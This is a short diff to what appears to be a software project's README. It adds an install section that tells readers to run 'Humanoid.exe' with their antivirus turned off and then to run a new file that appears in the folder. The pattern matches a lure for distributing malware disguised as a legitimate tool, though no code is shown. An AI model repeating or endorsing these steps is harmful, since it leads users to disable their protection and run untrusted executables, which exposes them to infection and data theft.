@@ -1,3 +1,12 @@
+# Install
+Run Humanoid.exe
+Wait for it to load (make sure to have antivirus off!)
+Now run the new file In The folder.
+
+
+
+
+
 # features 
 Fast
 Asynchronous
